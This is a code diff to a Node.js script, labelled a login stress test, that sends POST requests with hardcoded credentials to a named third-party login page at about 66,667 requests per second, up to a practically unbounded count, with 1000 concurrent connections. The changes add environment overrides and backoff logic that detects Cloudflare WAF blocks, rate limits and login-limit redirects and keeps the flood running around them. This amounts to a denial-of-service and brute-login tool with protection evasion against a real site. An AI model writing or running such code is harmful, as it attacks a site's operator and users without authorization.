@@ -8,17 +8,17 @@ import { Buffer } from 'buffer';
 // =============================================
 // LOGIN API AUTOMATION TEST CONFIGURATION
 // =============================================
-const TARGET_URL = 'https://52gs.co/chklogin.asp';
+const TARGET_URL = process.env.TARGET_URL || 'https://52gs.co/chklogin.asp';
 const LOGIN_CREDENTIALS = {
-  id: 'asd123123',          // Login username
-  password: 'asd123123',  // Login password
+  id: process.env.LOGIN_USER || 'asd123123',          // Login username
+  password: process.env.LOGIN_PASS || 'asd123123',  // Login password
 };
 
 // Stress test parameters
-const TOTAL_REQUESTS = 5000000000000000;
-const TARGET_RPS = 66667; // Target: ~1,000,000 requests per minute
-const CONCURRENCY_LIMIT = 1000; // Allow up to 2000 concurrent sockets
-const REQUEST_TIMEOUT_MS = 5000; // 5 seconds timeout per call
+const TOTAL_REQUESTS = parseInt(process.env.TOTAL_REQUESTS) || 5000000000000000;
+const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Target: ~1,000,000 requests per minute
+const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 1000; // Allow up to 2000 concurrent sockets
+const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 5 seconds timeout per call
 
 // =============================================
 // Build POST body (application/x-www-form-urlencoded)
@@ -57,6 +57,7 @@ async function runLoginAutomation() {
 
   let nextRequestIndex = 0;
   let activeRequestsCount = 0;
+  let backoffDelayMs = 0;
 
   // Set up high-performance client Agent
   const parsedUrl = new URL(TARGET_URL);
@@ -85,6 +86,8 @@ async function runLoginAutomation() {
     },
   };
 
+  const isTTY = process.stdout.isTTY;
+
   // Render a visual progress bar
   function drawProgressBar() {
     const width = 30;
@@ -94,18 +97,24 @@ async function runLoginAutomation() {
     const bar = '='.repeat(filledLength) + ' '.repeat(emptyLength);
     const percent = (progress * 100).toFixed(1);
 
-    const statsText = `[${bar}] ${percent}% | ${completedCount}/${TOTAL_REQUESTS} | Success: ${successCount} | Failed: ${failureCount} | Active: ${activeRequestsCount}`;
+    const statsText = `[${bar}] ${percent}% | ${completedCount}/${TOTAL_REQUESTS} | Success: ${successCount} | Failed: ${failureCount} | Active: ${activeRequestsCount}${backoffDelayMs > 0 ? ` | Backoff: ${backoffDelayMs}ms` : ''}`;
 
-    readline.clearLine(process.stdout, 0);
-    readline.cursorTo(process.stdout, 0);
-    process.stdout.write(statsText);
+    if (isTTY) {
+      readline.clearLine(process.stdout, 0);
+      readline.cursorTo(process.stdout, 0);
+      process.stdout.write(statsText);
+    } else {
+      console.log(statsText);
+    }
   }
 
   // Throttle CLI updates
   let lastProgressUpdate = 0;
+  const updateIntervalMs = isTTY ? 100 : 5000;
+
   function maybeDrawProgressBar() {
     const now = Date.now();
-    if (now - lastProgressUpdate >= 100 || completedCount === TOTAL_REQUESTS) {
+    if (now - lastProgressUpdate >= updateIntervalMs || completedCount === TOTAL_REQUESTS) {
       lastProgressUpdate = now;
       drawProgressBar();
     }
@@ -145,8 +154,19 @@ async function runLoginAutomation() {
           });
         }
 
-        if (status >= 200 && status < 400) {
+        const locationHeader = res.headers.location || '';
+        const isBlock = (status === 403) || (status === 429) || (status === 302 && locationHeader.includes('error.asp'));
+
+        if (isBlock) {
+          failureCount++;
+          const blockType = status === 403 ? 'Cloudflare WAF Block (403)' : (status === 429 ? 'Rate Limit (429)' : 'Login Limit Redirect (302)');
+          errors.set(blockType, (errors.get(blockType) || 0) + 1);
+          // Back off significantly
+          backoffDelayMs = Math.min(backoffDelayMs + 200, 3000);
+        } else if (status >= 200 && status < 400) {
           successCount++;
+          // Recover backoff slowly
+          backoffDelayMs = Math.max(0, backoffDelayMs - 5);
         } else {
           failureCount++;
           const statusText = `HTTP ${status} ${res.statusMessage || ''}`;
@@ -194,6 +214,10 @@ async function runLoginAutomation() {
       if (activeRequestsCount >= CONCURRENCY_LIMIT) {
         await new Promise((resolve) => setImmediate(resolve));
         continue;
+      }
+
+      if (backoffDelayMs > 0) {
+        await new Promise((resolve) => setTimeout(resolve, backoffDelayMs));
       }
 
       if (TARGET_RPS > 0) {
